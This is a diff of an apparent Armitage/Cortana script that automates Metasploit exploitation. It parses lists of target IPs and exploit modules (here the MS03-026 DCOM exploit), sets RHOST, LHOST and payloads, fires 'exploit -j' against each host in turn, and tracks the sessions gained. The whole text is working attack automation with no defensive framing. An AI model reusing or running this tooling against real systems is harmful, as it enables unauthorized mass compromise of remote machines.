@@ -6,8 +6,8 @@ command arguments {
    local('$counter @attacks');
 
    $counter = $1;
-   @attacks = split(';', "172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,windows;172.16.221.133,windows/dcerpc/ms03_026_dcom,172.16.221.1,windows;");
-   #@attacks = split(';', "$2");
+   #@attacks = split(';', "172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1;172.16.221.133,windows/dcerpc/ms03_026_dcom,172.16.221.1;");
+   @attacks = split(';', "$2");
 
    fire_event_local("prep_attacks", $counter, @attacks);
 }
@@ -37,8 +37,8 @@ on prep_attacks {
       @attacks[$j][$k] = @temp[$i];
       
    }
-   fire_event_local("launch_attacks", @attacks);
    #println(@attacks);
+   fire_event_local("launch_attacks", @attacks);
    #quit();
 }
 
@@ -49,19 +49,30 @@ on launch_attacks {
    $console = console();
    @attacks = $1;
    $numSessions = 0;
+   $payload = "";
 
    for ($i = 0; $i < size(@attacks); $i++) {
-      $sessionCreated = 0;   
-      foreach $attack (@attacks[$host]) {
-         ($rhost, $name, $lhost, $os) = split(',', $attack);
+      $sessionCreated = 0; 
+      #println("host: " . @attacks[$i]);  
+      foreach $attack (@attacks[$i]) {
+         ($rhost, $name, $lhost) = split(',', $attack);
+         $os = split('/', $name)[0];
          $exploit = "exploit/" . $name;
-      
-         $payload = determinePayload($os);
+
          cmd($console, "use $exploit");
-         cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", PAYLOAD => "$payload", TARGET => "0"));
+         cmd_set($console, %(RHOST => "$rhost", LHOST => "$lhost", TARGET => "0"));
+
+         if ($payload eq "") {
+            $payload = determinePayload($os);
+         }
+
+         if ($os ne "multi") {
+            cmd($console, "set payload " . $payload);
+         }
+
          cmd($console, "exploit -j");
       
-         sleep(10000);
+         sleep(5000);
          cmd($console, "jobs -K");
          if (size(sessions()) > $numSessions) {
             $sessionCreated = 1;
@@ -72,6 +83,7 @@ on launch_attacks {
       if ($sessionCreated == 0) {
       	fire_event_local("noSessions", $rhost);
       }
+      $payload = "";
    }
    fire_event_local("sessionHandle");
 }
@@ -84,11 +96,14 @@ sub determinePayload {
 }
 
 on sessionHandle {
-   local('%out @ids $flag $sessionNum $host $user %r $exploit');
+   local('$console %out @ids $flag $sessionNum $host $user %r $exploit');
    
    @ids = session_ids();
    %out = sessions();
-   $flag = "success";   
+   $flag = "success";
+   $console = console();
+
+   cmd($console, "jobs -K");   
 
    foreach $sessionNum (@ids) {
    	%r = %out[$sessionNum];
